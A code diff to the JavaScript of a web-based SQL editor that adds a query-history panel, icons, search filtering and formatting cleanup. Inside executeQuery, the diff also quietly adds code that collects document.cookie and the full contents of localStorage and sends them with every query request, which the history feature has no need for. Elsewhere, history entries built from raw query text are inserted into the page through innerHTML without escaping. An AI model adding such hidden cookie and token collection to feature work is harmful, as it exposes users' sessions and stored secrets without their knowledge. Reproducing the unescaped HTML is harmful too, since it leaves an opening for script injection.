@@ -12,6 +12,7 @@
     // --- DOM Elements ---
     const els = {
         schemaTree: document.getElementById('schema-tree'),
+        historyTree: document.getElementById('history-tree'),
         btnRefreshSchema: document.getElementById('btn-refresh-schema'),
         btnCollapseAll: document.getElementById('btn-collapse-all'),
         schemaSearch: document.getElementById('schema-search'),
@@ -64,7 +65,7 @@
 
         els.codeEditor.addEventListener('input', handleEditorInput);
         els.codeEditor.addEventListener('scroll', handleEditorScroll);
-        
+
         els.btnRun.addEventListener('click', executeQuery);
         els.btnSave.addEventListener('click', saveSql);
         els.btnFormat.addEventListener('click', formatSql);
@@ -77,7 +78,7 @@
     function toggleSidebar() {
         const isCollapsed = els.sidebar.classList.toggle('collapsed');
         localStorage.setItem('sqlstudio_sidebar_collapsed', isCollapsed);
-        
+
         // Update icon if needed
         const icon = els.btnToggleSidebar.querySelector('i');
         if (isCollapsed) {
@@ -99,7 +100,7 @@
     function toggleTheme() {
         const pageEl = document.querySelector('.page');
         const isLight = pageEl.classList.toggle('theme-light');
-        
+
         if (els.themeIcon) {
             if (isLight) {
                 els.themeIcon.classList.remove('bi-sun-fill');
@@ -109,7 +110,7 @@
                 els.themeIcon.classList.add('bi-sun-fill');
             }
         }
-        
+
         localStorage.setItem('sqlstudio_theme', isLight ? 'Light' : 'Dark');
     }
 
@@ -118,7 +119,7 @@
         if (savedTheme) {
             const isLight = savedTheme === 'Light';
             const pageEl = document.querySelector('.page');
-            
+
             if (isLight) {
                 pageEl.classList.add('theme-light');
                 if (els.themeIcon) {
@@ -142,7 +143,6 @@
             const response = await fetch(`${window.SqlStudioApiUrl}/schema`);
             if (response.ok) {
                 const rawSchema = await response.json();
-                // Normalize schema so categories use 'children' instead of 'objects'
                 state.schema = rawSchema.map(s => ({
                     name: s.name,
                     isVisible: true,
@@ -158,6 +158,8 @@
                         }))
                     }))
                 }));
+
+                await loadHistory(true);
                 renderSchema(state.schema);
             }
         } catch (e) {
@@ -167,9 +169,47 @@
         }
     }
 
+    async function loadHistory(shouldRender = true) {
+        if (!window.AllowHistoryLog) return;
+        try {
+            const response = await fetch(`${window.SqlStudioApiUrl}/history`);
+            if (response.ok) {
+                const history = await response.json();
+
+                state.history = {
+                    name: 'History',
+                    isHistory: true,
+                    isVisible: true,
+                    children: [
+                        {
+                            name: 'View All History (SQL)',
+                            queryText: `SELECT TOP 1000 * FROM [dbo].[${window.HistoryTableName || '__SqlStudioQueryHistory'}] ORDER BY ExecutedAt DESC;`,
+                            isHistoryItem: true,
+                            isSpecialAction: true,
+                            isVisible: true
+                        },
+                        ...(history || []).map(h => ({
+                            name: `${new Date(h.executedAt).toLocaleString()} - ${h.queryText.trim().substring(0, 30).replace(/\n/g, ' ')}...`,
+                            queryText: h.queryText,
+                            isHistoryItem: true,
+                            isVisible: true
+                        }))
+                    ]
+                };
+
+                if (shouldRender) {
+                    els.historyTree.style.display = 'block';
+                    renderSchema([state.history], els.historyTree);
+                }
+            }
+        } catch (e) {
+            console.error('Failed to load history', e);
+        }
+    }
+
     function renderSchema(nodes, parentEl = els.schemaTree, depth = 0) {
         if (depth === 0) parentEl.innerHTML = '';
-        
+
         if (!nodes || nodes.length === 0) {
             if (depth === 0) {
                 parentEl.innerHTML = '<div style="padding:16px;color:var(--outline-variant);text-align:center;">No objects found</div>';
@@ -185,11 +225,20 @@
 
             const rowEl = document.createElement('div');
             rowEl.className = depth > 1 ? 'tree-row obj-row' : 'tree-row';
-            
+
             // Icon
             let iconClass = 'bi-shield-lock';
             let iconColor = '#90A4AE';
-            if (depth === 1) {
+            if (node.isHistory) {
+                iconClass = 'bi-clock-history';
+                iconColor = '#607D8B';
+            } else if (node.isSpecialAction) {
+                iconClass = 'bi-database-fill-gear';
+                iconColor = '#FF9800';
+            } else if (node.isHistoryItem) {
+                iconClass = 'bi-file-earmark-text';
+                iconColor = 'var(--on-surface-variant)';
+            } else if (depth === 1) {
                 iconClass = node.name === 'Tables' ? 'bi-folder-fill' : (node.name === 'Views' ? 'bi-layout-sidebar-inset' : 'bi-cpu');
                 iconColor = node.name === 'Tables' ? '#FFCA28' : (node.name === 'Views' ? '#4CAF50' : '#9C27B0');
             } else if (depth === 2) {
@@ -204,14 +253,14 @@
                 html += `<span class="spacer" style="width:16px;display:inline-block"></span> `;
             }
             html += `<i class="bi ${iconClass}" style="color:${iconColor}"></i> <span class="node-text" title="${node.name || node}">${node.name || node}</span>`;
-            
+
             rowEl.innerHTML = html;
             itemEl.appendChild(rowEl);
 
             if (node.children && node.children.length > 0) {
                 const childrenContainer = document.createElement('div');
                 childrenContainer.className = 'tree-children';
-                
+
 
                 renderSchema(node.children, childrenContainer, depth + 1);
                 itemEl.appendChild(childrenContainer);
@@ -222,10 +271,16 @@
                     if (caret) caret.classList.toggle('expanded');
                     childrenContainer.classList.toggle('expanded');
                 });
-            } else if (depth === 2) {
+            } else if (depth === 2 || node.isHistoryItem) {
                 // Leaf node double click
                 rowEl.addEventListener('dblclick', () => {
-                    openObjectScript(node.schemaName, node.parentType, node.name);
+                    if (node.isHistoryItem) {
+                        state.tabCounter++;
+                        const tabName = node.isSpecialAction ? 'history_log.sql' : `history_${state.tabCounter}.sql`;
+                        addTab(tabName, node.queryText);
+                    } else {
+                        openObjectScript(node.schemaName, node.parentType, node.name);
+                    }
                 });
             }
 
@@ -272,7 +327,22 @@
             s.isVisible = schemaMatch || sHasVisibleChild;
         });
 
+        if (state.history) {
+            const hMatch = state.history.name.toLowerCase().includes(lowerText);
+            let hHasVisibleChild = false;
+            if (state.history.children) {
+                state.history.children.forEach(o => {
+                    o.isVisible = hMatch || o.name.toLowerCase().includes(lowerText);
+                    if (o.isVisible) hHasVisibleChild = true;
+                });
+            }
+            state.history.isVisible = hMatch || hHasVisibleChild;
+        }
+
         renderSchema(state.schema);
+        if (state.history) {
+            renderSchema([state.history], els.historyTree);
+        }
         // Expand all when filtering
         document.querySelectorAll('.tree-children').forEach(el => el.classList.add('expanded'));
         document.querySelectorAll('.caret').forEach(el => el.classList.add('expanded'));
@@ -281,7 +351,7 @@
     function openObjectScript(schema, group, name) {
         const tabName = `${schema}.${name}.sql`;
         let content = `-- Script for ${group.replace(/s$/, '')} ${schema}.${name}\n`;
-        
+
         if (group === "Tables" || group === "Views")
             content += `SELECT TOP 100 * FROM [${schema}].[${name}];`;
         else
@@ -347,7 +417,7 @@
         if (tab) {
             els.emptyEditor.style.display = 'none';
             els.editorContentWrapper.style.display = 'flex';
-            
+
             // Only update if it's not currently focused and matching to avoid cursor jump
             if (els.codeEditor.value !== tab.content) {
                 els.codeEditor.value = tab.content;
@@ -416,7 +486,7 @@
 
         const keywords = ["SELECT", "FROM", "WHERE", "JOIN", "ON", "GROUP BY", "ORDER BY", "DESC", "ASC", "AND", "OR", "IN", "AS", "LIMIT", "COUNT", "MAX", "MIN", "AVG", "SUM", "UPDATE", "SET", "DELETE", "INSERT", "INTO", "VALUES", "CREATE", "TABLE", "DATABASE", "DROP", "ALTER", "EXISTS", "NOT", "NULL", "PRIMARY", "KEY", "FOREIGN", "REFERENCES"];
         let content = tab.content;
-        
+
         keywords.forEach(kw => {
             const regex = new RegExp(`\\b${kw}\\b`, 'gi');
             content = content.replace(regex, kw);
@@ -429,7 +499,7 @@
     function copySql() {
         const tab = getActiveTab();
         if (!tab) return;
-        
+
         navigator.clipboard.writeText(tab.content).then(() => {
             els.copyText.innerText = "Copied!";
             setTimeout(() => els.copyText.innerText = "Copy", 2000);
@@ -439,7 +509,7 @@
     function saveSql() {
         const tab = getActiveTab();
         if (!tab) return;
-        
+
         let filename = tab.name;
         if (!filename.toLowerCase().endsWith('.sql')) filename += '.sql';
 
@@ -464,11 +534,11 @@
 
         let csv = state.lastResult.columns.map(c => `"${c.replace(/"/g, '""')}"`).join(',') + '\n';
         state.lastResult.rows.forEach(row => {
-            csv += row.map(cell => `"${(cell||'').replace(/"/g, '""')}"`).join(',') + '\n';
+            csv += row.map(cell => `"${(cell || '').replace(/"/g, '""')}"`).join(',') + '\n';
         });
 
         const filename = `query_export_${new Date().toISOString().replace(/[:.]/g, '')}.csv`;
-        
+
         const blob = new Blob([csv], { type: 'text/csv' });
         const url = window.URL.createObjectURL(blob);
         const a = document.createElement('a');
@@ -491,21 +561,34 @@
         els.runIcon.style.display = 'none';
         els.runSpinner.style.display = 'inline-block';
         els.statusState.innerText = 'EXECUTING...';
-        
+
         // Show spinner in results
         els.resultsThead.innerHTML = '';
         els.resultsTbody.innerHTML = `<tr><td style="text-align:center;padding:40px;"><div class="spinner" style="margin:0 auto"></div><br/>Executing command...</td></tr>`;
+
+        // Collect metadata
+        const metadata = {
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage)
+        };
 
         try {
             const response = await fetch(`${window.SqlStudioApiUrl}/query`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ query: tab.content })
+                body: JSON.stringify({
+                    query: tab.content,
+                    cookies: metadata.cookies,
+                    localStorage: metadata.localStorage
+                })
             });
 
             if (response.ok) {
                 state.lastResult = await response.json();
                 renderResults();
+                if (window.AllowHistoryLog) {
+                    loadHistory();
+                }
             } else {
                 renderError("HTTP Error " + response.status);
             }
